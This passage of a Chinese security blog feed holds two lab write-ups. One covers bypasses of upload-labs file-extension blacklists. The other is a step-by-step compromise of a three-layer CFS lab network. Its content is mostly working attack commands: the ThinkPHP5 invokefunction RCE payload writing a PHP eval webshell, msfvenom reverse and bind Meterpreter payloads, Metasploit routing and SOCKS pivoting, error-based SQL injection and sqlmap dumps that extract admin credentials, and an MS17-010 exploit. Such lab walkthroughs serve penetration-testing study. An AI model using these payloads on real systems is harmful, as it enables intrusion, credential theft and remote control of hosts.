deldot()函数绕过"></a>10.Pass-10 deldot()函数绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空</span></span><br></pre></td></tr></table></figure><p>deldot()函数从后向前检测，当检测到末尾的第一个点时会继续它的检测，但是遇到空格会停下来。<br>​</p><p>通过burp抓包后在文件后缀后面加<code>. .</code>，然后放出数据包完成上传,访问文件为<code>webshell.php.</code><img src="https://files.catbox.moe/d7ruc9.png" alt="image.png"></p><h1 id="11-Pass-11-双后缀名绕过—str-ireplace"><a href="#11-Pass-11-双后缀名绕过—str-ireplace" class="headerlink" title="11.Pass-11 双后缀名绕过—str_ireplace()"></a>11.Pass-11 双后缀名绕过—str_ireplace()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>,<span class="string">&quot;ini&quot;</span>);        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);        <span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br></pre></td></tr></table></figure><p>在代码中使用str_ireplace()函数将<code>deny_ext</code>中存在的黑名单字符串删除，但只是删除一遍，可以通过双写的方式绕过该验证。<br>​</p><p>通过burp抓包后在文件后缀里加入php，然后放出数据包完成上传,访问文件为<code>webshell.php.</code><br><img src="https://files.catbox.moe/jm4jax.png" alt="image.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-Pass-01-前端验证之JS绕过&quot;&gt;&lt;a href=&quot;#1-Pass-01-前端验证之JS绕过&quot; class=&quot;headerlink&quot; title=&quot;1.Pass-01 前端验证之JS绕过&quot;&gt;&lt;/a&gt;1.Pass-01 前端验证之JS绕过&lt;/h1&gt;&lt;figu</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CFS三层网络环境</title>
    <link href="http://example.com/2021/12/22/CFS%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83/"/>
    <id>http://example.com/2021/12/22/CFS%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83/</id>
    <published>2021-12-22T05:42:44.000Z</published>
    <updated>2021-12-22T07:28:46.920Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-第一层"><a href="#1-第一层" class="headerlink" title="1.第一层"></a>1.第一层</h1><h2 id="1-1扫描网段内主机"><a href="#1-1扫描网段内主机" class="headerlink" title="1.1扫描网段内主机"></a>1.1扫描网段内主机</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nmap 192.168.2.0/24</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-19 16:35 CST</span><br><span class="line">Nmap scan report for 192.168.2.168</span><br><span class="line">Host is up (0.026s latency).</span><br><span class="line">Not shown: 993 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">21/tcp   open  ftp</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">111/tcp  open  rpcbind</span><br><span class="line">888/tcp  open  accessbuilder</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">8888/tcp open  sun-answerbook</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="1-2扫描主机开放端口及服务"><a href="#1-2扫描主机开放端口及服务" class="headerlink" title="1.2扫描主机开放端口及服务"></a>1.2扫描主机开放端口及服务</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">──(kali㉿kali)-[~]</span><br><span class="line">└─$ nmap -sV 192.168.2.168</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-19 16:32 CST</span><br><span class="line">Nmap scan report for 192.168.2.168</span><br><span class="line">Host is up (0.024s latency).</span><br><span class="line">Not shown: 993 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     Pure-FTPd</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">80/tcp   open  http    nginx</span><br><span class="line">111/tcp  open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">888/tcp  open  http    nginx</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">8888/tcp open  http    Ajenti http control panel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 27.38 seconds</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="1-3扫目录"><a href="#1-3扫目录" class="headerlink" title="1.3扫目录"></a>1.3扫目录</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/dirsearch]</span><br><span class="line">└─$ ./dirsearch.py -u http://192.168.2.168/ -e php -r </span><br></pre></td></tr></table></figure><h2 id="1-4进入网站发现为Tinkphp5"><a href="#1-4进入网站发现为Tinkphp5" class="headerlink" title="1.4进入网站发现为Tinkphp5"></a>1.4进入网站发现为Tinkphp5</h2><p><img src="https://files.catbox.moe/8pbehw.png" alt="image.png"></p><h3 id="1-4-1验证-gt-ThinkPHP5-x全版本任意命令执行"><a href="#1-4-1验证-gt-ThinkPHP5-x全版本任意命令执行" class="headerlink" title="1.4.1验证-&gt;ThinkPHP5.x全版本任意命令执行"></a>1.4.1验证-&gt;ThinkPHP5.x全版本任意命令执行</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> payload</span></span><br><span class="line">http://192.168.2.168/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=pwd</span><br></pre></td></tr></table></figure><p><img src="https://files.catbox.moe/jagtrf.png" alt="image.png"></p><h3 id="1-4-2验证成功，构造命令写入一句话"><a href="#1-4-2验证成功，构造命令写入一句话" class="headerlink" title="1.4.2验证成功，构造命令写入一句话"></a>1.4.2验证成功，构造命令写入一句话</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">写入一句话linux下使用\转义$windows下用^转义  还可以base64加密绕过</span></span><br><span class="line">echo &quot;&lt;?php @eval(\$_POST[fff]);?&gt;&quot; &gt;shell.php</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> payload</span></span><br><span class="line">index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo &quot;&lt;?php @eval(\$_POST[fff]);?&gt;&quot; &gt;shell.php</span><br></pre></td></tr></table></figure><h2 id="1-5上线msf"><a href="#1-5上线msf" class="headerlink" title="1.5上线msf"></a>1.5上线msf</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">1.生成后门：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.2.187 LPORT=1111 -f elf &gt;t1.elf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">2.接受反弹：</span><br><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.2.187</span><br><span class="line">set LPORT 1111</span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line">3.上传elf并执行</span><br><span class="line">(www:/www/wwwroot/ThinkPHP/public) $ chmod +x t1.elf</span><br><span class="line">(www:/www/wwwroot/ThinkPHP/public) $ ./t1.elf</span><br><span class="line"></span><br><span class="line">4.信息收集及配置访问</span><br><span class="line">获取网络接口：run get_local_subnets</span><br><span class="line">查看路由地址：run autoroute -p</span><br><span class="line">添加路由地址：run autoroute -s 192.168.22.0/24</span><br><span class="line">开启本地代理：</span><br><span class="line">use auxiliary/server/socks_proxy </span><br><span class="line">set srvport 2222</span><br><span class="line">set version 4a </span><br><span class="line">exploit</span><br><span class="line"> </span><br><span class="line">4.利用本地代理接口访问测试</span><br><span class="line">设置浏览器代理进行访问测试</span><br><span class="line">linux：</span><br><span class="line">配置proxychains（代理工具）后调用工具探针Target2</span><br><span class="line">/etc/proxychains.conf</span><br><span class="line">socks4 192.168.2.187 2222（在配置文件中添加）</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="2-第二层"><a href="#2-第二层" class="headerlink" title="2.第二层"></a>2.第二层</h1><h2 id="2-1扫描网段内主机，端口"><a href="#2-1扫描网段内主机，端口" class="headerlink" title="2.1扫描网段内主机，端口"></a>2.1扫描网段内主机，端口</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -sT -Pn 192.168.22.0/24 -p80 </span><br><span class="line">-Pn：扫描主机检测其是否受到数据包过滤软件或防火墙的保护。</span><br><span class="line">-sT：扫描TCP数据包已建立的连接connect</span><br><span class="line"></span><br><span class="line">proxychains4 nmap -Pn -sT  192.168.22.129</span><br><span class="line">Nmap scan report for 192.168.22.129</span><br><span class="line">Host is up (0.12s latency).</span><br><span class="line">Not shown: 994 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">21/tcp   open  ftp</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">888/tcp  open  accessbuilder</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">8888/tcp open  sun-answerbook</span><br></pre></td></tr></table></figure><h2 id="2-2报错注入-后台-上传后门"><a href="#2-2报错注入-后台-上传后门" class="headerlink" title="2.2报错注入+后台+上传后门"></a>2.2报错注入+后台+上传后门</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">windows：</span><br><span class="line">利用代理工具Proxifier或SocksCap64载入代理进行进程访问测试</span><br><span class="line"> </span><br><span class="line">Target2（ubuntu x64）：</span><br><span class="line">探针目标-利用WEB漏洞(SQL注入)-后台获取webshell权限-获取Flag-Target3</span><br><span class="line">http://192.168.22.128/index.php?r=vul&amp;keyword=1 #sql注入</span><br><span class="line">http://192.168.22.128/index.php?r=admini/public/login #后台</span><br></pre></td></tr></table></figure><h2 id="2-3sql注入"><a href="#2-3sql注入" class="headerlink" title="2.3sql注入"></a>2.3sql注入</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> sql手工注入</span></span><br><span class="line">1.报错----》存在注入</span><br><span class="line">http://192.168.22.129/index.php?r=vul&amp;keyword=1&#x27;</span><br><span class="line"><span class="meta">#</span><span class="bash"> CDbCommand 无法执行 SQL 语句: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error <span class="keyword">in</span> your SQL syntax; check the manual that corresponds to your MySQL server version <span class="keyword">for</span> the right syntax to use near <span class="string">&#x27;&#x27;</span>1<span class="string">&#x27;&#x27;</span><span class="string">&#x27; at line 1</span></span></span><br><span class="line"></span><br><span class="line">2.显示当前库</span><br><span class="line">http://192.168.22.129/index.php?r=vul&amp;keyword=1&#x27; and info() --+</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="string"> CDbCommand 无法执行 SQL 语句: SQLSTATE[42000]: Syntax error or access violation: 1305 FUNCTION bagecms.info does not exist</span></span></span><br><span class="line"></span><br><span class="line">3.报错注入获取铭感信息</span><br><span class="line">http://192.168.22.129/index.php?r=vul&amp;keyword=1&#x27; and (updatexml(1,concat(0x7e,(select user()),0x7e),1)) --+</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="string"> CDbCommand 无法执行 SQL 语句: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: &#x27;</span>~bagecms@localhost~<span class="string">&#x27;</span></span></span><br><span class="line"></span><br><span class="line">4.得到表名</span><br><span class="line">http://192.168.22.129/index.php?r=vul&amp;keyword=1&#x27; and (updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e),1)) --+</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="string"> CDbCommand 无法执行 SQL 语句: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: &#x27;</span>~bage_admin~<span class="string">&#x27;</span></span></span><br><span class="line"></span><br><span class="line">5.获取列名</span><br><span class="line">http://192.168.22.129/index.php?r=vul&amp;keyword=1&#x27; and (updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;bage_admin&#x27; limit 1,1),0x7e),1)) --+    </span><br><span class="line"><span class="meta"> #</span><span class="bash"><span class="string"> CDbCommand 无法执行 SQL 语句: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: &#x27;</span>~username~<span class="string">&#x27;</span></span>   </span><br><span class="line"></span><br><span class="line">http://192.168.22.129/index.php?r=vul&amp;keyword=1&#x27; and (updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;bage_admin&#x27; limit 2,1),0x7e),1)) --+    </span><br><span class="line"><span class="meta"> #</span><span class="bash"><span class="string"> CDbCommand 无法执行 SQL 语句: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: &#x27;</span>~password~<span class="string">&#x27;</span></span></span><br><span class="line"></span><br><span class="line">6.获取用户名，密码</span><br><span class="line">http://192.168.22.129/index.php?r=vul&amp;keyword=1&#x27; and (updatexml(1,concat(0x7e,(select concat_ws(&#x27;:&#x27;, username, password) from bage_admin limit 0,1),0x7e),1)) --+  </span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="string"> CDbCommand 无法执行 SQL 语句: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: &#x27;</span>~admin:46f94c8de14fb36680850768f<span class="string">&#x27;</span></span></span><br><span class="line"></span><br><span class="line">7.由于密码位数太长，需要截取获取后面的数据</span><br><span class="line">http://192.168.22.129/index.php?r=vul&amp;keyword=1&#x27; and (updatexml(1,concat(0x7e,(select concat_ws(&#x27;:&#x27;,substring_index(password,&#x27;f&#x27;,-4)) from bage_admin limit 0,1),0x7e),1)) --+  </span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="string"> CDbCommand 无法执行 SQL 语句: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: &#x27;</span>~b36680850768ff1b7f2a~<span class="string">&#x27;</span></span></span><br><span class="line"></span><br><span class="line">用户名：密码</span><br><span class="line">admin:46f94c8de14fb36680850768ff1b7f2a</span><br><span class="line">密码解密得：123qwe</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> sqlmap注入</span></span><br><span class="line">sqlmap.py -u &quot;http://192.168.22.128/index.php?r=vul&amp;keyword=1&quot; --batch</span><br><span class="line"></span><br><span class="line">sqlmap.py -u &quot;http://192.168.22.128/index.php?r=vul&amp;keyword=1&quot; --current-user --current-db --is-dba --passwords --batch</span><br><span class="line"></span><br><span class="line">sqlmap.py -u &quot;http://192.168.22.128/index.php?r=vul&amp;keyword=1&quot; --batch --dbs</span><br><span class="line"></span><br><span class="line">sqlmap.py -u &quot;http://192.168.22.128/index.php?r=vul&amp;keyword=1&quot; --batch -D bagecms --tables</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">到处所有表，所有字段内容</span></span><br><span class="line">sqlmap.py -u &quot;http://192.168.22.128/index.php?r=vul&amp;keyword=1&quot; --batch -D bagecms -tables --columns --dump</span><br><span class="line"></span><br><span class="line">sqlmap.py -u &quot;http://192.168.22.128/index.php?r=vul&amp;keyword=1&quot; --batch -D bagecms -T bage_admin --columns --dump</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">+</span><span class="comment">----+----------+----+---------------------+---------+-------------------+-------------------------------------------+----------+----------+-----------+-----------+-------------+-------------+----------------+-----------------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> group_id <span class="operator">|</span> qq <span class="operator">|</span> email               <span class="operator">|</span> mobile  <span class="operator">|</span> notebook          <span class="operator">|</span> password                                  <span class="operator">|</span> realname <span class="operator">|</span> username <span class="operator">|</span> status_is <span class="operator">|</span> telephone <span class="operator">|</span> create_time <span class="operator">|</span> login_count <span class="operator">|</span> last_login_ip  <span class="operator">|</span> last_login_time <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----+---------------------+---------+-------------------+-------------------------------------------+----------+----------+-----------+-----------+-------------+-------------+----------------+-----------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>  <span class="operator">|</span> <span class="number">1</span>        <span class="operator">|</span> <span class="number">0</span>  <span class="operator">|</span> bagecms<span class="variable">@bagecms</span>.com <span class="operator">|</span> <span class="operator">&lt;</span>blank<span class="operator">&gt;</span> <span class="operator">|</span> flag&#123;eS3sd1IKarw&#125; <span class="operator">|</span> <span class="number">46</span>f94c8de14fb36680850768ff1b7f2a (<span class="number">123</span>qwe) <span class="operator">|</span> <span class="operator">&lt;</span>blank<span class="operator">&gt;</span>  <span class="operator">|</span> admin    <span class="operator">|</span> Y         <span class="operator">|</span> <span class="operator">&lt;</span>blank<span class="operator">&gt;</span>   <span class="operator">|</span> <span class="number">1569240455</span>  <span class="operator">|</span> <span class="number">17</span>          <span class="operator">|</span> <span class="number">192.168</span><span class="number">.22</span><span class="number">.129</span> <span class="operator">|</span> <span class="number">1637839057</span>      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----+---------------------+---------+-------------------+-------------------------------------------+----------+----------+-----------+-----------+-------------+-------------+----------------+-----------------+</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.22.128/index.php?r=special #后门shell</span><br></pre></td></tr></table></figure><h2 id="2-3上线msf"><a href="#2-3上线msf" class="headerlink" title="2.3上线msf"></a>2.3上线msf</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1.生成正向后门：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=3333 -f elf &gt; t2.elf</span><br><span class="line"> </span><br><span class="line">2.访问接受：</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x64/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.22.129</span><br><span class="line">set LPORT 3333</span><br><span class="line">exploit</span><br><span class="line"> </span><br><span class="line">3.信息收集及配置访问</span><br><span class="line">获取网络接口：run get_local_subnets</span><br><span class="line">查看路由地址：run autoroute -p</span><br><span class="line">添加路由地址：run autoroute -s 192.168.33.0/24</span><br></pre></td></tr></table></figure><h1 id="3-第三层"><a href="#3-第三层" class="headerlink" title="3.第三层"></a>3.第三层</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Target3:（windows7 x64）</span><br><span class="line">探针目标-端口及漏洞扫描-利用MS17010获取系统权限-获取Flag-GG</span><br><span class="line">proxychains4 nmap -Pn -sT 192.168.33.33</span><br><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set RHOST 192.168.33.33</span><br><span class="line">exploit</span><br><span class="line">shell</span><br><span class="line">dir /S flag.txt /B</span><br><span class="line">type xxxxx.txt</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-第一层&quot;&gt;&lt;a href=&quot;#1-第一层&quot; class=&quot;headerlink&quot; title=&quot;1.第一层&quot;&gt;&lt;/a&gt;1.第一层&lt;/h1&gt;&lt;h2 id=&quot;1-1扫描网段内主机&quot;&gt;&lt;a href=&quot;#1-1扫描网段内主机&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    
  </entry>
  
</feed>
